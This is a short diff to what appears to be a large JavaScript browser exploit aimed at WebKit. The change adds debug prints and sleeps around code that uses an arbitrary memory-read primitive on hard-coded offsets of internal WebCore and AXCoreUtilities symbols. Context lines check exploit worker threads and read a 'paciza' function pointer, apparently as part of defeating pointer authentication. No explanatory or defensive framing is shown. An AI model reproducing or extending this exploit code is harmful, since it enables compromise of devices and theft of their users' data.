@@ -18803,8 +18803,11 @@ async function main() {
           print(`class load workers found: ${class_load_workers.length}`);
           if (class_load_workers.length < 3)
             throw new Error("missing class load workers");
+          print(`defaultLoader read begin addr=${offsets.AXCoreUtilities__DefaultLoader.hex()}`);
+          sleep(10);
           const defaultLoader = p.read64(offsets.AXCoreUtilities__DefaultLoader);
           print(`defaultLoader: ${defaultLoader.hex()}`);
+          sleep(10);
           if (defaultLoader) {
             const paciza_nullfunc = p.read64(offsets.WebCore__softLinkDDDFACacheCreateFromFramework);
             print(`paciza_nullfunc: ${paciza_nullfunc.hex()}`);
